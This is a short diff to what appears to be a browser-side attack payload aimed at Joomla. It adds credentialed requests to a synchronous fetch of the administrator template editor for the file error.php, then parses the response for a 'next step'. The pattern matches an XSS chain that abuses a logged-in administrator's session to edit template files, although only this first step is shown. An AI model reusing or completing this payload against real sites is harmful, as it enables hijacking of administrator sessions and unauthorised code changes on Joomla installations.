@@ -8,6 +8,7 @@ xhttp.onreadystatechange = function() {
 		response1 = this.responseText;
 	}
 };
+xhttp.withCredentials = true;
 xhttp.open("GET", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", false); //asynchronous false: need to get whole response text for next step
 xhttp.send();
 var parser = new DOMParser();
